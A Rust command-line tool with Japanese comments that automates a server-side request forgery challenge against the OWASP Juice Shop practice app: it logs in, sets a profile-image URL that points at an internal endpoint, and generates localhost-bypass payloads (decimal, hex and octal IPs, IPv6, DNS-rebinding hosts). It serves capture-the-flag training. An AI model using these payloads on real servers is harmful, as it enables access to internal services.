//! SSRF 攻撃ツール
//! 
//! Usage: cargo run --bin ssrf-attack
//! 
//! Environment variables:
//!   JUICE_SHOP_URL - Juice Shop URL (default: http://localhost:3000)
//!   JUICE_SHOP_EMAIL - Login email
//!   JUICE_SHOP_PASSWORD - Login password

use serde_json::json;
use std::error::Error;

/// SSRF ペイロードを生成する
pub fn generate_ssrf_payloads(port: u16) -> Vec<(&'static str, String)> {
    vec![
        // 基本形
        ("Basic", format!("http://localhost:{}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3", port)),
        ("127.0.0.1", format!("http://127.0.0.1:{}/api/Challenges", port)),
        
        // IPv6
        ("IPv6", format!("http://[::1]:{}/api/Challenges", port)),
        
        // Decimal IP (127.0.0.1 = 2130706433)
        ("Decimal IP", format!("http://2130706433:{}/api/Challenges", port)),
        
        // Hex IP
        ("Hex IP", format!("http://0x7f000001:{}/api/Challenges", port)),
        
        // Octal IP
        ("Octal IP", format!("http://0177.0.0.1:{}/api/Challenges", port)),
        
        // DNS rebinding
        ("DNS rebinding", format!("http://localtest.me:{}/api/Challenges", port)),
        ("nip.io", format!("http://127.0.0.1.nip.io:{}/api/Challenges", port)),
    ]
}

/// IP アドレスを decimal 形式に変換
pub fn ip_to_decimal(a: u8, b: u8, c: u8, d: u8) -> u32 {
    ((a as u32) << 24) | ((b as u32) << 16) | ((c as u32) << 8) | (d as u32)
}

/// IP アドレスを hex 形式に変換
pub fn ip_to_hex(a: u8, b: u8, c: u8, d: u8) -> String {
    format!("0x{:02x}{:02x}{:02x}{:02x}", a, b, c, d)
}

fn main() -> Result<(), Box<dyn Error>> {
    println!("=== Juice Shop SSRF Attack Tool ===\n");
    
    let base_url = std::env::var("JUICE_SHOP_URL")
        .unwrap_or_else(|_| "http://localhost:3000".to_string());
    
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()?;
    
    // ログイン情報
    let email = std::env::var("JUICE_SHOP_EMAIL")
        .unwrap_or_else(|_| "test@test.com".to_string());
    let password = std::env::var("JUICE_SHOP_PASSWORD")
        .unwrap_or_else(|_| "test123".to_string());
    
    println!("[*] Target: {}", base_url);
    println!("[*] Logging in as: {}", email);
    
    // ログイン
    let login_res = client
        .post(format!("{}/rest/user/login", base_url))
        .json(&json!({
            "email": email,
            "password": password
        }))
        .send();
    
    let token = match login_res {
        Ok(res) if res.status().is_success() => {
            let body: serde_json::Value = res.json()?;
            body["authentication"]["token"]
                .as_str()
                .map(|s| s.to_string())
                .ok_or("Failed to get token")?
        }
        Ok(res) => {
            return Err(format!("Login failed: {}", res.status()).into());
        }
        Err(e) => {
            println!("[-] Could not connect to Juice Shop: {}", e);
            println!("[*] Showing SSRF payloads instead...\n");
            show_payloads();
            return Ok(());
        }
    };
    
    println!("[+] Got token: {}...", &token[..20.min(token.len())]);
    
    // SSRF ペイロード
    let ssrf_url = "http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3";
    
    println!("\n[*] Attempting SSRF attack...");
    println!("[*] Payload URL: {}", ssrf_url);
    
    // プロフィール画像URLを設定
    let ssrf_res = client
        .post(format!("{}/profile/image/url", base_url))
        .header("Authorization", format!("Bearer {}", token))
        .header("Content-Type", "application/json")
        .json(&json!({
            "imageUrl": ssrf_url
        }))
        .send()?;
    
    println!("[+] SSRF Response: {} {}", ssrf_res.status(), ssrf_res.text()?);
    
    // チャレンジ完了を確認
    println!("\n[*] Checking challenge status...");
    let challenges: serde_json::Value = client
        .get(format!("{}/api/Challenges", base_url))
        .send()?
        .json()?;
    
    if let Some(data) = challenges["data"].as_array() {
        for challenge in data {
            let name = challenge["name"].as_str().unwrap_or("");
            if name.to_lowercase().contains("ssrf") {
                let solved = challenge["solved"].as_bool().unwrap_or(false);
                println!("[{}] {}: {}", 
                    if solved { "+" } else { "-" },
                    name,
                    if solved { "SOLVED!" } else { "Not solved" }
                );
            }
        }
    }
    
    Ok(())
}

fn show_payloads() {
    println!("=== SSRF Payloads ===\n");
    
    for (name, url) in generate_ssrf_payloads(3000) {
        println!("{:15} → {}", name, url);
    }
    
    println!("\n=== IP Conversions ===");
    println!("127.0.0.1 decimal: {}", ip_to_decimal(127, 0, 0, 1));
    println!("127.0.0.1 hex:     {}", ip_to_hex(127, 0, 0, 1));
    
    println!("\n=== Malware location ===");
    println!("/ftp/quarantine/ contains malware files with the internal URL");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ip_to_decimal() {
        // 127.0.0.1 = 2130706433
        assert_eq!(ip_to_decimal(127, 0, 0, 1), 2130706433);
        
        // 192.168.1.1 = 3232235777
        assert_eq!(ip_to_decimal(192, 168, 1, 1), 3232235777);
        
        // 10.0.0.1 = 167772161
        assert_eq!(ip_to_decimal(10, 0, 0, 1), 167772161);
    }

    #[test]
    fn test_ip_to_hex() {
        assert_eq!(ip_to_hex(127, 0, 0, 1), "0x7f000001");
        assert_eq!(ip_to_hex(192, 168, 1, 1), "0xc0a80101");
        assert_eq!(ip_to_hex(10, 0, 0, 1), "0x0a000001");
    }

    #[test]
    fn test_generate_ssrf_payloads() {
        let payloads = generate_ssrf_payloads(3000);
        
        assert!(!payloads.is_empty());
        
        // 各ペイロードがURLとして有効な形式か確認
        for (name, url) in &payloads {
            assert!(url.starts_with("http://"), "{} should start with http://", name);
            assert!(url.contains(":3000"), "{} should contain port 3000", name);
        }
    }

    #[test]
    fn test_ssrf_key_url() {
        let payloads = generate_ssrf_payloads(3000);
        let basic = &payloads[0];
        
        assert!(basic.1.contains("tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"));
        assert!(basic.1.contains("server-side"));
    }

    #[test]
    fn test_localhost_variations() {
        let payloads = generate_ssrf_payloads(3000);
        
        // localhost のバリエーションが含まれていることを確認
        let has_localhost = payloads.iter().any(|(_, url)| url.contains("localhost"));
        let has_127 = payloads.iter().any(|(_, url)| url.contains("127.0.0.1"));
        let has_ipv6 = payloads.iter().any(|(_, url)| url.contains("[::1]"));
        let has_decimal = payloads.iter().any(|(_, url)| url.contains("2130706433"));
        
        assert!(has_localhost);
        assert!(has_127);
        assert!(has_ipv6);
        assert!(has_decimal);
    }
}
